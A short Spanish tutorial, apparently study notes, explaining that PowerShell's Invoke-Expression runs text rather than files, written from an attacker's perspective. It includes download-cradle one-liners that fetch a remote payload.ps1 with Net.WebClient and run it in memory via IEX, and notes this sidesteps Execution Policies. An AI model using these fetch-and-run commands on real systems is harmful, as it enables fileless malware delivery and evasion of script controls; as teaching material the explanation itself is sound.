
 **IEX / Invoke-Expression NO ejecuta archivos.**
 
 **IEX ejecuta TEXTO.**

Ese matiz es clave.

```

Antes de empezar con la explicación, ten en cuenta que IEX, tal y como vas a escuchar muchas veces,ejecuta texto, 
PERO
ese texto tiene que tener comandos de powershell, no basta con poner IEX("MIERDAMIERDA"),
tiene que haber un comando que acompañe a MIERDAMIERDAMIERDA como por ejemplo 
"write-host MIERDAMIERDAMIERDA".
Por eso en los casos que estamos hablando de coger el contenido de un payload funciona sin problemas,
porque el contenido de ese archivo contiene comandos powershell.

```

---

## ✅ Forma correcta de pensarlo

El mejor caso para un atacante es:

 Convertir cualquier payload en **texto en memoria**
 Ejecutar ese texto con `IEX`

No ejecutar archivos.

---

## 🔎 Qué sí puede ejecutar IEX

```powershell
$texto = "Write-Host Hola"
IEX $texto
```

```powershell
$texto = (New-Object Net.WebClient).DownloadString("http://site/payload.ps1")
IEX $texto
```

Funciona porque es texto.

---

## ❌ Qué NO ejecuta IEX

```powershell
IEX C:\temp\script.ps1
```

Eso NO ejecuta el archivo.

Porque eso es una ruta, no código.

---

## 🧠 Si quieres ejecutar un archivo

```powershell
.\script.ps1
```

o

```powershell
powershell -File script.ps1
```

Y ahí entran Execution Policies.

---

## ✅ Resumen correcto

 El atacante **no quiere ejecutar archivos**
 Quiere **ejecutar texto en memoria**
 Para eso usa `IEX`

---

## 🧩 Frase final

El payload ideal no es un archivo.

El payload ideal es **texto que se convierte en código**.

---

---

# ✅ 1️⃣ Tengo un archivo .ps1 local → lo convierto en texto → lo ejecuto con IEX

Correcto.

Ejemplo:

```powershell
$texto = Get-Content C:\test.ps1 -Raw
IEX $texto
```

Qué ocurre:

* Lees el contenido del archivo
* Lo conviertes en texto
* IEX ejecuta ese texto

👉 No se aplican Execution Policies.

---

# ✅ 2️⃣ Tengo un archivo .ps1 local → lo ejecuto directamente

Correcto.

```powershell
.\test.ps1
```

O:

```powershell
powershell -File test.ps1
```

 Aquí sí se aplican Execution Policies.

---

# ✅ 3️⃣ Descargo archivo desde Internet → convierto a texto → IEX

Correcto.

```powershell
$texto = (New-Object Net.WebClient).DownloadString("http://site/test.ps1")
IEX $texto
```

No hay archivo en disco.
No hay políticas.

---

# ✅ 4️⃣ Descargo archivo desde Internet → guardo archivo → lo ejecuto

Correcto.

```powershell
(New-Object Net.WebClient).DownloadFile("http://site/test.ps1","C:\test.ps1")
.\test.ps1
```

Aquí:

* Hay archivo
* Se aplican políticas

---

# ❌ Punto clave

No puedes hacer:

```powershell
IEX C:\test.ps1
```

Porque eso es una ruta, no código.


---

# 🧩 Tu resumen corregido

✔ Si convierto archivo a texto → uso IEX
✔ Si ejecuto archivo → uso `.\archivo.ps1`
✔ Si descargo texto → IEX
✔ Si descargo archivo → `.\archivo.ps1`

---

# 📌 Tabla rápida

| Situación          | Cómo ejecutar |
| ------------------ | ------------- |
| Texto en variable  | IEX           |
| Texto descargado   | IEX           |
| Archivo local      | .\script.ps1  |
| Archivo descargado | .\script.ps1  |

---

